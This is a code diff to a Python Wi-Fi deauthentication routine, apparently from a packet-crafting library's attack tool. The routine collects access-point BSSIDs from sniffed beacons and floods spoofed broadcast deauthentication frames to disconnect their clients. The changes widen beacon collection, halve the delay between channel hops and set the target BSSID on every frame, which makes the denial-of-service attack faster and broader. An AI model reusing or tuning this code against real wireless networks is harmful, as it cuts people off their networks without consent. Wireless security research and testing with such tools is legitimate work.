@@ -71,7 +71,7 @@ def wifi_deauth_cb(pargs):
 			except Exception as ex:
 				logger.warning(ex)
 			# TODO: use channel info from radiotap?
-			if not pargs.nobroadcast and pkt_ieee80211.is_beacon():
+			if pkt_ieee80211.is_beacon():
 				bssid = pkt_ieee80211.beacon.bssid
 				# don't overwrite already stored client MACs
 				if bssid not in wdata[pargs.current_channel]:
@@ -115,7 +115,7 @@ def wifi_deauth_cb(pargs):
 			pargs.current_channel = channel
 
 			try:
-				time.sleep(0.5 if cnt == 0 else 0.15)
+				time.sleep(0.5 if cnt == 0 else 0.075)
 			except KeyboardInterrupt:
 				pargs.is_running = False
 				break
@@ -123,23 +123,20 @@ def wifi_deauth_cb(pargs):
 			logger.info("deauth on channel %3d (%3d APs, round %4d)",
 						channel, len(wdata[channel]), cnt)
 
-			# TODO: check for asynch errors
 			ap_clients = copy.copy(wdata[channel])
 
 			for mac_ap, macs_clients in ap_clients.items():
 				layer_deauth.seq += 1
+				layer_deauth.bssid = mac_ap
 
 				if not pargs.nobroadcast:
 					# reset src/dst for broadcast
-					layer_deauth.dst = b"\xFF" * 6
 					layer_deauth.src = b"\xFF" * 6
-					# set target AP
-					layer_deauth.bssid = mac_ap
+					layer_deauth.dst = b"\xFF" * 6
 
 					# TODO: increase?
 					# TODO: check sequence
 					# logger.debug("deauth AP: %r", mac_ap)
-
 					for _ in range(5):
 						layer_deauth.seq += 1
 						psock_send.send(pkt_deauth.bin())
